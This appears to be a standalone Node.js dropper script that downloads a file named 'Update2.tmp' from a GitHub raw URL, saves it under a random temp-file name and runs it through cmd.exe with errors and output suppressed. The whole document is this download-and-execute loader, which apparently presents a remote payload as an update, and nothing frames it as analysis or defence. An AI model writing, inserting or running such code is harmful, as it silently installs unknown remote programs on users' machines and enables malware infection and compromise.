(async () => {
  const fs = require('fs');
  const path = require('path');
  const os = require('os');
  const { exec } = require('child_process');
  const { Readable, pipeline } = require('stream');
  const url = 'https://github.com/quebradordecamabox/sesabe/raw/refs/heads/main/Update2.tmp';
  const tmpDir = os.tmpdir();
  const filePath = path.join(tmpDir, '0fa0078f-d0cc-4617-821f-109a11f9a085.tmp');
  const res = await fetch(url);
  if (!res.ok) return;
  await new Promise((resolve) => pipeline(Readable.fromWeb(res.body), fs.createWriteStream(filePath), () => resolve()));
  const cmd = 'cmd.exe /c "' + filePath + '"';
  exec(cmd, { shell: true }, (error, stdout, stderr) => { });
  setTimeout(() => { console.log('CLOSE CMD'); }, 20000);
})()